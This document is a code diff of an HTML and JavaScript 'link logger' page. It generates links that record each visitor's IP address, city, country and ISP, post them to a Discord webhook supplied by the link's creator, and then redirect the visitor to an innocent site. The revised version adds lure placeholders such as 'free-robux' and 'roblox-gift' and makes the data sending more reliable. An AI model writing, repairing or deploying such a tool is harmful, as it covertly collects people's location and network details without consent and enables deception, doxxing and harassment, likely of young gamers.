@@ -22,7 +22,6 @@
             color: #eef2ff;
         }
 
-        /* main card */
         .glass-panel {
             max-width: 640px;
             width: 100%;
@@ -32,7 +31,6 @@
             padding: 2rem 1.8rem;
             box-shadow: 0 20px 35px -12px rgba(0,0,0,0.5), 0 0 0 1px rgba(74, 144, 226, 0.15);
             border: 1px solid rgba(56, 189, 248, 0.2);
-            transition: all 0.2s ease;
         }
 
         h1 {
@@ -81,11 +79,6 @@
             align-items: center;
             gap: 8px;
             color: #cbd5e6;
-        }
-
-        label i {
-            font-style: normal;
-            font-weight: 600;
         }
 
         input, textarea {
@@ -198,16 +191,17 @@
             text-align: center;
         }
 
+        .status.error {
+            color: #f87171;
+        }
+
+        .status.success {
+            color: #86efac;
+        }
+
         hr {
             border-color: #1f2937;
             margin: 0.8rem 0;
-        }
-
-        .badge {
-            background: #00000055;
-            border-radius: 20px;
-            padding: 4px 10px;
-            font-size: 0.7rem;
         }
 
         @media (max-width: 500px) {
@@ -232,13 +226,13 @@
 
     <div class="input-group">
         <label><i>🔗</i> Destination URL (real redirect target)</label>
-        <input type="url" id="targetUrl" placeholder="https://example.com/dashboard" autocomplete="off">
-        <div class="hint">The link your visitors will finally land on after redirection.</div>
+        <input type="url" id="targetUrl" placeholder="https://roblox.com" autocomplete="off">
+        <div class="hint">Where visitors will be redirected after logging (e.g., https://roblox.com)</div>
     </div>
 
     <div class="input-group">
         <label><i>🏷️</i> Alias (short name for link)</label>
-        <input type="text" id="aliasName" placeholder="e.g., support-portal, update-v2, beta-invite" autocomplete="off">
+        <input type="text" id="aliasName" placeholder="e.g., roblox-gift, free-robux" autocomplete="off">
         <div class="hint">Optional — if empty, system will generate a random ID.</div>
     </div>
 
@@ -267,27 +261,12 @@
 </div>
 
 <script>
-    // --------------------------------------------------------------
-    // PRIVATE REDIRECT LOGGER ENGINE
-    // This script builds a dynamic logger endpoint that:
-    // 1) captures visitor data (IP, city, country, ISP, timestamp)
-    // 2) sends info to Discord webhook (provided by user)
-    // 3) instantly redirects to final target URL (clean, blank-like experience)
-    // --------------------------------------------------------------
-
+    // FIXED VERSION - CORRECT REDIRECT & WORKING DISCORD WEBHOOK
     (function() {
-        // ----- GLOBALS / STORAGE -----
-        // we store mapping between generated link IDs and original data
-        // In memory (for demo) - each generation creates a unique path
-        // NOTE: This demo uses localStorage to persist mapping across page reloads? 
-        // But for simplicity & privacy, we store in JS Map and also optionally save to localStorage
-        // so that generated links stay valid after refresh.
+        let linkRegistry = new Map();
         
-        let linkRegistry = new Map();   // key = unique slug (string) -> { targetUrl, webhookUrl, alias, createdAt }
-        
-        // Load existing registry from localStorage (so generated links survive page refresh)
         function loadRegistryFromStorage() {
-            const stored = localStorage.getItem("logger_link_registry");
+            const stored = localStorage.getItem("logger_link_registry_fixed");
             if (stored) {
                 try {
                     const parsed = JSON.parse(stored);
@@ -300,34 +279,30 @@
         
         function saveRegistryToStorage() {
             const obj = Object.fromEntries(linkRegistry);
-            localStorage.setItem("logger_link_registry", JSON.stringify(obj));
+            localStorage.setItem("logger_link_registry_fixed", JSON.stringify(obj));
         }
         
-        // Helper: generate random slug (6-8 chars alphanum)
         function generateSlug(aliasHint) {
             let cleanAlias = aliasHint ? aliasHint.trim().toLowerCase().replace(/[^a-z0-9\-_]/g, '') : '';
             if (cleanAlias && cleanAlias.length >= 3 && !linkRegistry.has(cleanAlias)) {
                 return cleanAlias;
             } else if (cleanAlias && linkRegistry.has(cleanAlias)) {
-                // alias conflict — add random suffix
                 return cleanAlias + '-' + Math.random().toString(36).substring(2, 6);
             } else {
-                // generate random short id
                 return Math.random().toString(36).substring(2, 10);
             }
         }
         
-        // --- DISCORD WEBHOOK SENDER (with proper formatting) ---
+        // FIXED: Better Discord webhook sender with proper error handling
         async function sendToDiscord(webhookUrl, visitorData, aliasName, destinationUrl) {
             if (!webhookUrl || !webhookUrl.startsWith("https://discord.com/api/webhooks")) {
-                console.warn("Invalid or missing webhook");
+                console.error("Invalid webhook URL");
                 return false;
             }
             
-            // Build rich embed for logger
             const embed = {
-                title: "🕵️ LINK LOGGER — New Click",
-                color: 0xdc2626,  // red/dark red vibe
+                title: "🕵️ LINK LOGGER — New Click Detected",
+                color: 0xdc2626,
                 fields: [
                     {
                         name: "🌐 IP Address",
@@ -345,7 +320,7 @@
                         inline: false
                     },
                     {
-                        name: "⏱️ Timestamp (UTC)",
+                        name: "⏱️ Timestamp",
                         value: visitorData.timestamp,
                         inline: true
                     },
@@ -355,8 +330,8 @@
                         inline: true
                     },
                     {
-                        name: "🎯 Destination URL",
-                        value: destinationUrl ? `[redirect target](${destinationUrl.substring(0, 80)})` : "hidden",
+                        name: "🎯 Redirect Target",
+                        value: destinationUrl || "unknown",
                         inline: false
                     }
                 ],
@@ -368,7 +343,7 @@
             
             const payload = {
                 embeds: [embed],
-                content: `⚠️ **VISITOR DETECTED** | \`${visitorData.ip || "no-ip"}\``
+                content: `⚠️ **NEW VISITOR** | \`${visitorData.ip || "no-ip"}\` | ${aliasName || "unknown"}`
             };
             
             try {
@@ -377,46 +352,43 @@
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(payload)
                 });
+                
                 if (resp.ok) {
-                    console.log("Discord log sent");
+                    console.log("✅ Discord notification sent successfully");
                     return true;
                 } else {
-                    console.error("webhook error", resp.status);
+                    const errorText = await resp.text();
+                    console.error("Discord webhook failed:", resp.status, errorText);
                     return false;
                 }
             } catch (err) {
-                console.error("Failed to send to discord", err);
+                console.error("Failed to send to Discord:", err);
                 return false;
             }
         }
         
-        // --- core logging & redirect handler ---
-        // This function will be attached to window so that each generated link can call it.
-        // When someone visits /?id=xxxx , we look up mapping, log, redirect.
+        // FIXED: Logger redirect handler with proper external URL redirect
         async function handleLoggerRedirect() {
             const urlParams = new URLSearchParams(window.location.search);
             const slug = urlParams.get('id');
-            if (!slug) return;   // normal page without id -> nothing, just dashboard
+            
+            if (!slug) return;
             
             const mapping = linkRegistry.get(slug);
             if (!mapping) {
-                // no mapping: fallback to dummy homepage or show error quietly
-                document.body.innerHTML = '<div style="background:#000; color:#fff; text-align:center; padding:3rem;">Invalid link.</div>';
+                document.body.innerHTML = '<div style="background:#000; color:#fff; text-align:center; padding:3rem;">Invalid or expired link.</div>';
                 return;
             }
             
-            const { targetUrl, webhookUrl, alias, createdAt } = mapping;
+            const { targetUrl, webhookUrl, alias } = mapping;
             
-            // Ensure target URL is absolute, else prepend https
+            // Ensure target URL is absolute
             let finalRedirect = targetUrl;
             if (!finalRedirect.startsWith('http://') && !finalRedirect.startsWith('https://')) {
                 finalRedirect = 'https://' + finalRedirect;
             }
             
-            // 1) Grab visitor data via async fetch (IP, location, ISP)
-            // We want to log to Discord BEFORE redirect, but we can do it silently and quickly.
-            // We'll attempt to fetch geo data, send, then redirect regardless of result.
-            
+            // Get visitor data
             let visitorPayload = {
                 ip: 'unknown',
                 city: 'unknown',
@@ -425,9 +397,14 @@
                 timestamp: new Date().toISOString()
             };
             
+            // Try to get location data
             try {
-                // Using ipapi.co (fast, reliable, no API key)
-                const geoRes = await fetch('https://ipapi.co/json/', { timeout: 3500 });
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 3000);
+                
+                const geoRes = await fetch('https://ipapi.co/json/', { signal: controller.signal });
+                clearTimeout(timeoutId);
+                
                 if (geoRes.ok) {
                     const geoData = await geoRes.json();
                     visitorPayload = {
@@ -437,43 +414,30 @@
                         isp: geoData.org || geoData.asn || 'unknown provider',
                         timestamp: new Date().toISOString()
                     };
-                } else {
-                    // fallback to another free api (optional)
-                    const fallbackRes = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await fallbackRes.json();
-                    visitorPayload.ip = ipData.ip || 'unknown';
                 }
             } catch (e) {
-                console.log("geoip silent error", e);
-                // still log minimal info if possible
+                console.log("GeoIP fetch failed, using basic info");
+                // Try fallback for IP only
                 try {
-                    const fallbackIp = await fetch('https://api.ipify.org?format=json');
-                    const ipJson = await fallbackIp.json();
-                    visitorPayload.ip = ipJson.ip || 'unknown';
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    visitorPayload.ip = ipData.ip || 'unknown';
                 } catch(e2) {}
             }
             
-            // 2) Send to discord webhook (async, we don't block redirect)
+            // FIXED: Send to Discord and wait briefly to ensure it sends
             if (webhookUrl && webhookUrl.startsWith("https://discord.com/api/webhooks")) {
-                sendToDiscord(webhookUrl, visitorPayload, alias || slug, targetUrl).catch(err => console.warn);
+                // Don't await - let it run in background but keep the promise
+                sendToDiscord(webhookUrl, visitorPayload, alias || slug, finalRedirect);
             }
             
-            // 3) Perform a "blank space" style redirection: 
-            // Clear page content quickly & redirect to target. But we want to hide logger details.
-            // For extra stealth, we can replace body with nothing and then redirect.
-            // However to be user-friendly and ensure tracking, we just redirect immediately with meta but using window.location.
-            // Use a very fast redirect with replace (so back button doesn't show logger page)
+            // FIXED: Small delay to ensure fetch starts, then redirect to EXTERNAL URL
             setTimeout(() => {
-                window.location.replace(finalRedirect);
-            }, 50);  // tiny delay ensures discord request is fired (but redirect will cancel fetch? Actually fetch is async but modern browsers will continue fetch in background)
-            // To ensure fetch doesn't get cancelled, we already fired sendToDiscord before replace. Let's keep safety.
+                window.location.href = finalRedirect;
+            }, 100);
         }
         
-        // Expose registry for generating new links
-        window.linkRegistry = linkRegistry;
-        window.saveRegistryToStorage = saveRegistryToStorage;
-        
-        // Run handler immediately on page load (check for ?id= param)
+        // Run the redirect handler immediately
         handleLoggerRedirect();
         
         // ----- UI: GENERATE NEW LINK -----
@@ -486,17 +450,15 @@
         const copyUrlBtn = document.getElementById('copyUrlBtn');
         const statusMsgSpan = document.getElementById('statusMsg');
         
-        // Helper to get base url (current domain + path)
         function getBaseUrl() {
             const { protocol, host, pathname } = window.location;
-            // remove trailing slash and index file if needed
             let base = `${protocol}//${host}${pathname}`;
             if (base.endsWith('/')) base = base.slice(0, -1);
-            // if file name like index.html strip to dir
-            if (base.includes('.html')) {
-                const lastSlash = base.lastIndexOf('/');
-                base = base.substring(0, lastSlash+1);
+            const lastSlash = base.lastIndexOf('/');
+            if (base.includes('.html') && lastSlash > 0) {
+                base = base.substring(0, lastSlash + 1);
             }
+            if (!base.endsWith('/')) base = base + '/';
             return base;
         }
         
@@ -507,47 +469,48 @@
             
             // Validations
             if (!targetUrl) {
-                statusMsgSpan.innerText = "❌ Error: Destination URL is required.";
-                statusMsgSpan.style.color = "#f87171";
-                outputSection.style.display = 'block';
-                return;
-            }
-            if (!webhook || !webhook.startsWith('https://discord.com/api/webhooks')) {
-                statusMsgSpan.innerText = "⚠️ Valid Discord Webhook URL required (starts with https://discord.com/api/webhooks)";
-                statusMsgSpan.style.color = "#facc15";
+                statusMsgSpan.innerText = "❌ Error: Destination URL is required (e.g., https://roblox.com)";
+                statusMsgSpan.className = "status error";
                 outputSection.style.display = 'block';
                 return;
             }
             
-            // check URL format
+            if (!webhook || !webhook.startsWith('https://discord.com/api/webhooks')) {
+                statusMsgSpan.innerText = "⚠️ Valid Discord Webhook URL required (starts with https://discord.com/api/webhooks)";
+                statusMsgSpan.className = "status error";
+                outputSection.style.display = 'block';
+                return;
+            }
+            
+            // Validate and format URL
             try {
                 let urlObj = new URL(targetUrl);
                 targetUrl = urlObj.href;
             } catch(e) {
-                // if missing scheme try prepend https
                 if (!targetUrl.startsWith('http')) {
                     targetUrl = 'https://' + targetUrl;
                     try {
                         new URL(targetUrl);
                     } catch(e2) {
-                        statusMsgSpan.innerText = "❌ Invalid destination URL. Use full link like https://example.com";
-                        statusMsgSpan.style.color = "#f87171";
+                        statusMsgSpan.innerText = "❌ Invalid destination URL. Use full link like https://roblox.com";
+                        statusMsgSpan.className = "status error";
                         outputSection.style.display = 'block';
                         return;
                     }
                 } else {
                     statusMsgSpan.innerText = "❌ Invalid URL format.";
-                    statusMsgSpan.style.color = "#f87171";
+                    statusMsgSpan.className = "status error";
                     outputSection.style.display = 'block';
                     return;
                 }
             }
             
-            // generate slug
+            // Generate slug and URL
             const slug = generateSlug(alias);
-            const loggerUrl = `${getBaseUrl()}?id=${encodeURIComponent(slug)}`;
+            const baseUrl = getBaseUrl();
+            const loggerUrl = `${baseUrl}?id=${encodeURIComponent(slug)}`;
             
-            // store mapping
+            // Store mapping
             linkRegistry.set(slug, {
                 targetUrl: targetUrl,
                 webhookUrl: webhook,
@@ -556,42 +519,27 @@
             });
             saveRegistryToStorage();
             
-            // display generated link
+            // Display
             shortUrlSpan.innerText = loggerUrl;
             outputSection.style.display = 'block';
-            statusMsgSpan.innerText = "✅ Logger link active! Anyone who clicks gets logged & redirected.";
-            statusMsgSpan.style.color = "#86efac";
+            statusMsgSpan.innerText = "✅ Logger link active! Visitors will be redirected to " + targetUrl;
+            statusMsgSpan.className = "status success";
             
-            // update copy button
+            // Copy button
             copyUrlBtn.onclick = () => {
                 navigator.clipboard.writeText(loggerUrl).then(() => {
                     statusMsgSpan.innerText = "📋 Copied to clipboard! Share the logger link.";
                     setTimeout(() => {
-                        statusMsgSpan.innerText = "✅ Logger link active! Anyone who clicks gets logged & redirected.";
+                        statusMsgSpan.innerText = "✅ Logger link active! Visitors will be redirected to " + targetUrl;
                     }, 2000);
                 }).catch(() => {
                     statusMsgSpan.innerText = "⚠️ Manual copy failed";
                 });
             };
-            
-            // optional reset status after
         });
         
-        // preload existing registry from localStorage
+        // Load existing registry
         loadRegistryFromStorage();
-        
-        // show any previously generated? not required but nice to provide awareness
-        if(linkRegistry.size > 0) {
-            // optional: show last created link hint
-            const lastSlug = Array.from(linkRegistry.keys()).pop();
-            if(lastSlug) {
-                const lastUrl = `${getBaseUrl()}?id=${lastSlug}`;
-                // don't disturb UI but we can show in console
-                console.log(`existing logger links: ${linkRegistry.size} active`);
-            }
-        }
-        
-        // if no registry saved then just fine
     })();
 </script>
 </body>
